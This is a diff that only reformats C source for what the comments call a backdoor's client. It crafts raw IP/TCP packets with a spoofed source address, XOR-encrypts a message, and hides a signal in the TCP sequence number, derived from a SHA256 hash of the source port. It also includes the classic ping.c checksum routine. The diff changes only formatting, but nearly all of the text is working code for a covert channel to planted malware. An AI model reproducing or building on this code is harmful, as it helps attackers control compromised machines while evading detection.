@@ -11,18 +11,22 @@
 #include <unistd.h>
 
 /*
- * Sends the the given message to the given address. The message is sent according to the protocol
- * used by the backdoor. The msg is encrypted using XOR and the TCP sequence number is the first
- * 4B of the SHA256 hash of the source port.
+ * Sends the the given message to the given address. The message is sent
+ * according to the protocol used by the backdoor. The msg is encrypted using
+ * XOR and the TCP sequence number is the first 4B of the SHA256 hash of the
+ * source port.
  *
  * Params:
  *      const struct in_addr address: The address of the backdoor.
- *      const unsigned short port: The value to be used for the TCP source port. The TCP sequence number
- *                                 will be derived from this.
- *      const char *msg: The message to encrypt and send.
- *      const int msg_len: The length of the message to send.
+ *
+ *      const unsigned short port: The value to be used for the TCP source port.
+ * The TCP sequence number will be derived from this.
+ *
+ *      const char *msg: The message to encrypt and send. const int msg_len: The
+ * length of the message to send.
  */
-void send_message_to_ip(const struct in_addr address, const unsigned short port, char *msg, int msg_len)
+void send_message_to_ip(const struct in_addr address, const unsigned short port,
+                        char *msg, int msg_len)
 {
     const int SEND_FLAGS = 0;
     int sock;
@@ -36,7 +40,8 @@ void send_message_to_ip(const struct in_addr address, const unsigned short port,
     srand(time(0));
 
     // open raw socket
-    if ((sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) return;
+    if ((sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0)
+        return;
 
     // create ip header
     fill_iphdr(&send_tcp.ip, address);
@@ -61,7 +66,8 @@ void send_message_to_ip(const struct in_addr address, const unsigned short port,
         memcpy(packet + hdr_len, msg, msg_len);
 
         // write packet packet
-        sendto(sock, packet, packet_len, SEND_FLAGS, (struct sockaddr *)&sin, sizeof(sin));
+        sendto(sock, packet, packet_len, SEND_FLAGS, (struct sockaddr *)&sin,
+               sizeof(sin));
 
         // clean up
         free(packet);
@@ -78,9 +84,10 @@ void send_message_to_ip(const struct in_addr address, const unsigned short port,
  *
  * Params:
  *      struct iphdr* hdr: The IPv4 header structure to fill.
+ *
  *      const struct in_addr address; The destination address to use.
  */
-void fill_iphdr(struct iphdr* hdr, const struct in_addr address)
+void fill_iphdr(struct iphdr *hdr, const struct in_addr address)
 {
     struct in_addr src_addr;
     inet_pton(AF_INET, SOURCE_ADDR, &src_addr.s_addr);
@@ -106,10 +113,12 @@ void fill_iphdr(struct iphdr* hdr, const struct in_addr address)
  *
  * Params:
  *      struct tcphdr* hdr: The TCP header structure to fill.
+ *
  *      const short src_port: The source port to use.
+ *
  *      const shrot dst_port: The destination port to use.
  */
-void fill_tcphdr(struct tcphdr* hdr, const short src_port, const short dst_port)
+void fill_tcphdr(struct tcphdr *hdr, const short src_port, const short dst_port)
 {
     hdr->source = htons(src_port);
     hdr->dest = htons(dst_port);
@@ -137,7 +146,7 @@ void fill_tcphdr(struct tcphdr* hdr, const short src_port, const short dst_port)
  * Params:
  *      struct ip_tcp_hdr* hdr: The IPv4 and TCP header to checksum.
  */
-void fill_tcp_checksum(struct ip_tcp_hdr* hdr)
+void fill_tcp_checksum(struct ip_tcp_hdr *hdr)
 {
     struct pseudo_header pHeader;
 
@@ -149,38 +158,39 @@ void fill_tcp_checksum(struct ip_tcp_hdr* hdr)
     pHeader.tcp_length = tmp;
     memcpy((char *)&pHeader.tcp, (char *)&hdr->tcp, hdr->tcp.doff * 4);
 
-    hdr->tcp.check = in_cksum((unsigned short *)&pHeader, sizeof(struct pseudo_header));
+    hdr->tcp.check =
+        in_cksum((unsigned short *)&pHeader, sizeof(struct pseudo_header));
 }
 
 /* clipped from ping.c (this function is the whore of checksum routines */
 /* as everyone seems to use it..I feel so dirty...) */
 
 /* Copyright (c)1987 Regents of the University of California.
-* All rights reserved.
-*
-* Redistribution and use in source and binary forms are permitted
-* provided that the above copyright notice and this paragraph are
-* dupliated in all such forms and that any documentation, advertising
-* materials, and other materials related to such distribution and use
-* acknowledge that the software was developed by the University of
-* California, Berkeley. The name of the University may not be used
-* to endorse or promote products derived from this software without
-* specific prior written permission. THIS SOFTWARE IS PROVIDED ``AS
-* IS'' AND WITHOUT ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING,
-* WITHOUT LIMITATION, THE IMPLIED WARRANTIES OF MERCHATIBILITY AND
-* FITNESS FOR A PARTICULAR PURPOSE
-*/
+ * All rights reserved.
+ *
+ * Redistribution and use in source and binary forms are permitted
+ * provided that the above copyright notice and this paragraph are
+ * dupliated in all such forms and that any documentation, advertising
+ * materials, and other materials related to such distribution and use
+ * acknowledge that the software was developed by the University of
+ * California, Berkeley. The name of the University may not be used
+ * to endorse or promote products derived from this software without
+ * specific prior written permission. THIS SOFTWARE IS PROVIDED ``AS
+ * IS'' AND WITHOUT ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING,
+ * WITHOUT LIMITATION, THE IMPLIED WARRANTIES OF MERCHATIBILITY AND
+ * FITNESS FOR A PARTICULAR PURPOSE
+ */
 unsigned short in_cksum(unsigned short *ptr, int nbytes)
 {
-    register long sum;              /* assumes long == 32 bits */
+    register long sum; /* assumes long == 32 bits */
     u_short oddbyte;
-    register u_short answer;        /* assumes u_short == 16 bits */
+    register u_short answer; /* assumes u_short == 16 bits */
 
     /*
-    * Our algorithm is simple, using a 32-bit accumulator (sum),
-    * we add sequential 16-bit words to it, and at the end, fold back
-    * all the carry bits from the top 16 bits into the lower 16 bits.
-    */
+     * Our algorithm is simple, using a 32-bit accumulator (sum),
+     * we add sequential 16-bit words to it, and at the end, fold back
+     * all the carry bits from the top 16 bits into the lower 16 bits.
+     */
 
     sum = 0;
     while (nbytes > 1)
@@ -192,17 +202,17 @@ unsigned short in_cksum(unsigned short *ptr, int nbytes)
     /* mop up an odd byte, if necessary */
     if (nbytes == 1)
     {
-        oddbyte = 0;                /* make sure top half is zero */
-        *((u_char *) &oddbyte) = *(u_char *)ptr;   /* one byte only */
+        oddbyte = 0;                            /* make sure top half is zero */
+        *((u_char *)&oddbyte) = *(u_char *)ptr; /* one byte only */
         sum += oddbyte;
     }
 
     /*
-    * Add back carry outs from top 16 bits to low 16 bits.
-    */
+     * Add back carry outs from top 16 bits to low 16 bits.
+     */
 
-    sum  = (sum >> 16) + (sum & 0xffff);    /* add high-16 to low-16 */
-    sum += (sum >> 16);             /* add carry */
-    answer = ~sum;                  /* ones-complement, then truncate to 16 bits */
-    return(answer);
+    sum = (sum >> 16) + (sum & 0xffff); /* add high-16 to low-16 */
+    sum += (sum >> 16);                 /* add carry */
+    answer = ~sum; /* ones-complement, then truncate to 16 bits */
+    return (answer);
 } /* end in_cksm() */
